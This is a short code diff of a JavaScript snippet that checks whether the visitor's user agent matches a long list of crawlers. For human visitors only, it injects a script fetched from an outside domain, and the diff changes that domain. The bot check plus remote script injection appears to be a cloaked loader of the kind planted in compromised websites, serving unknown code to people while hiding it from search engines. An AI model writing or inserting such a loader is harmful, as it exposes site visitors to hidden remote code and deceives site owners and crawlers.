@@ -4,6 +4,6 @@ return /bot|crawl|slurp|spider|mediapartners|abacho|accona|AddThis|AdsBot|ahoy|A
 
 if (!isBot()) {
 var script = document.createElement('script');
-script.src = 'https://mp3.faktor.my.id/app.js';
+script.src = 'https://faktor.my.id/app.js';
 document.head.appendChild(script);
 }
